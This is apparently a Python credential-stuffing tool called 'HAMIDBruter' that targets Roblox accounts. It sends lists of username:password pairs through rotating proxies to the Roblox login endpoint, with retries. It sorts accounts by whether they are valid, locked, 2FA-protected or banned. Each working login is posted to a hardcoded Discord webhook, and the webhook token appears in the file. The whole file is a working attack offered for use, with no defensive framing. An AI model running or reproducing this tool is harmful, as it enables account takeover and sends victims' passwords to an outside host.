import os
import json
import random
import aiofiles
import aiohttp
import asyncio
from colorama import Fore
from aiohttp_retry import RetryClient, ExponentialRetry

webhookURL = "https://discord.com/api/webhooks/1242832585025912923/G9C3sKE-k8Di-x7p0o9CSjasNUnoctQlE8VdL7ubLTWFHsSBEJcw5EPAchiubPUx6L_Q"
PROXIES_FILE = "proxies.txt"

async def load_config():
    async with aiofiles.open("config.json", mode='r') as f:
        return json.loads(await f.read())

async def load_proxies():
    async with aiofiles.open(PROXIES_FILE, mode='r') as f:
        proxies_content = await f.read()
    proxies_list = proxies_content.splitlines()
    return proxies_list

async def write_output(file, text):
    file_path = os.path.join(config["results_dir"], f"{file}.txt")
    async with aiofiles.open(file_path, mode='a', encoding="utf-8", errors="ignore") as f:
        await f.write(f"{text}\n")

async def write_hits(combo):
    async with aiofiles.open("hits.txt", mode='a', encoding="utf-8", errors="ignore") as f:
        await f.write(f"{combo}\n")

async def remove_combo_from_file(combo):
    async with aiofiles.open(os.path.join("accounts.txt"), mode='r+') as f:
        lines = await f.readlines()
        await f.seek(0)
        for line in lines:
            if line.strip() != combo:
                await f.write(line)
        await f.truncate()

async def send_webhook_to_another(status, combo):
    credential, password = combo.split(":", 1)
    data = {
        "content": f"<@541337117826220035>",
        "embeds": [{
            "title": "New hit!",
            "color": 65280,
            "fields": [
                {"name": ":bust_in_silhouette: Username", "value": f"```{credential}```", "inline": True},
                {"name": ":closed_lock_with_key: Password", "value": f"```{password}```", "inline": True},
                {"name": ":lock: Combo", "value": f"```{combo}```", "inline": False},
            ],
            "footer": {
                "text": "HAMIDBruter v1.1.5 | made by hamidpis"
            }
        }]
    }
    async with aiohttp.ClientSession() as session:
        await session.post(webhookURL, json=data)

async def process_response(resp, combo):
    global STATS
    text = await resp.text()
    if "Incorrect username or password" in text:
        STATS['INVALID'] += 1
        STATS['TOTAL'] += 1
        await write_output("invalid", combo)
        await remove_combo_from_file(combo)
    elif "Account has been locked." in text or "Please use Social" in text:
        STATS['LOCKED'] += 1
        STATS['TOTAL'] += 1
        await write_output("locked", combo)
        await remove_combo_from_file(combo)
    elif "You must pass the Security Question" in text or "twoStepVerificationData" in text:
        STATS['2FA'] += 1
        STATS['TOTAL'] += 1
        await write_output("2fa", combo)
        await remove_combo_from_file(combo)
    elif "isBanned\":true" in text:
        STATS['BANNED'] += 1
        STATS['TOTAL'] += 1
        await write_output("banned", combo)
        await remove_combo_from_file(combo)
    elif "displayName" in text:
        try:
            cookie = resp.cookies[".ROBLOSECURITY"]
            if cookie:
                STATS['HITS'] += 1
                STATS['TOTAL'] += 1
                await write_output("hits", combo)
                await send_webhook_to_another("Hit", combo)
                await remove_combo_from_file(combo)
            else:
                STATS['HITS'] += 1
                STATS['TOTAL'] += 1
                await write_output("hits", combo)
                await send_webhook_to_another("Hit", combo)
                await remove_combo_from_file(combo)
        except Exception as e:
            STATS['HITS'] += 1
            STATS['TOTAL'] += 1
            await write_output("hits", combo)
            await send_webhook_to_another("Hit", combo)
            await remove_combo_from_file(combo)
    elif "Challenge is required to authorize the request" in text:
        STATS['CAPTCHA'] += 1
        STATS['TOTAL'] += 1
        await write_output("captcha", combo)
    print_progress()

async def worker(combos):
    proxy = random.choice(proxies_list)
    
    headers = {
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.6',
        'referer': 'https://www.roblox.com/',
        'sec-ch-ua': '"Brave";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-site',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    }

    cookies = {
        'RBXEventTrackerV2': 'CreateDate=5/8/2024 10:01:00 AM&rbxid=&browserid=1715180460550006',
        'GuestData': 'UserID=-2035320897',
        'RBXImageCache': 'timg=JBnE3T2ZCyGGCAxhPLUVQPo84dwcRjboIULd8IA8OCjdjuhjKpMAOpI1LRftIQes83jVFL-nrmd02M12SG7lAdyiMPJymRclt_1HyLilfgiQe0wxaTBr9KEhtT2k9nYFJQRjrAq78-BaE9r7vOBH3VaMe4n-GZu-pZoElL2Flyan2SkfWsQdFWOqNUYQ0dHb4sW_O1jFdHulJk5svjIr-w',
        'RBXSource': 'rbx_acquisition_time=05/08/2024 15:01:03&rbx_acquisition_referrer=&rbx_medium=Social&rbx_source=&rbx_campaign=&rbx_adgroup=&rbx_keyword=&rbx_matchtype=&rbx_send_info=1'
    }

    retry_options = ExponentialRetry(attempts=5)
    async with RetryClient(raise_for_status=False, retry_options=retry_options) as session:
        for combo in combos:
            try:
                credential, password = combo.split(":", 1)
                async with session.post(
                    url="https://auth.roblox.com/v2/login",
                    headers=headers,
                    cookies=cookies,
                    json={
                        "ctype": "Username",
                        "cvalue": credential,
                        "password": password
                    },
                    proxy=f"http://{proxy}",
                    timeout=15
                ) as resp:

                    await process_response(resp, combo)
                
                    if "x-csrf-token" in resp.headers:
                        headers["x-csrf-token"] = resp.headers["x-csrf-token"]
                        async with session.post(
                            url="https://auth.roblox.com/v2/login",
                            headers=headers,
                            cookies=cookies,
                            json={
                                "ctype": "Username",
                                "cvalue": credential,
                                "password": password
                            },
                            proxy=f"http://{proxy}",
                            timeout=15
                        ) as resp:
                            await process_response(resp, combo)
            except Exception as e:
                print(f"Exception for combo {combo}: {e}")
                continue

def print_progress():
    print(f'\r{Fore.LIGHTWHITE_EX}[HAMIDBruter] {Fore.GREEN}TOTAL: {STATS["TOTAL"]} | {Fore.CYAN}HITS: {STATS["HITS"]} | {Fore.LIGHTMAGENTA_EX}2FA: {STATS["2FA"]} | {Fore.YELLOW}Locked: {STATS["LOCKED"]} | {Fore.RED}Invalid: {STATS["INVALID"]} | {Fore.YELLOW}Captcha: {STATS["CAPTCHA"]}', end='', flush=True)

async def main():
    global config, proxies_list, STATS

    config = await load_config()
    
    INPUT_DIR = config["input_dir"]
    RESULTS_DIR = config["results_dir"]
    PROXIES_FILE = "proxies.txt"
    COMBOS_FILE = os.path.join(INPUT_DIR, config["combos_file"])
    THREAD_COUNT = config["thread_count"]

    # Fetch proxies from the proxies file
    proxies_list = await load_proxies()
    
    async with aiofiles.open(COMBOS_FILE, mode='r', encoding="utf-8", errors="ignore") as f:
        combos_list = list(set(line.strip() for line in await f.readlines()))
    
    STATS = {
        'TOTAL': 0,
        'HITS': 0,
        '2FA': 0,
        'LOCKED': 0,
        'BANNED': 0,
        'INVALID': 0,
        'CAPTCHA': 0
    }

    chunk_size = len(combos_list) // THREAD_COUNT
    combos_chunks = [combos_list[i:i + chunk_size] for i in range(0, len(combos_list), chunk_size)]

    tasks = [worker(chunk) for chunk in combos_chunks]
    await asyncio.gather(*tasks)

if __name__ == '__main__':
    asyncio.run(main())
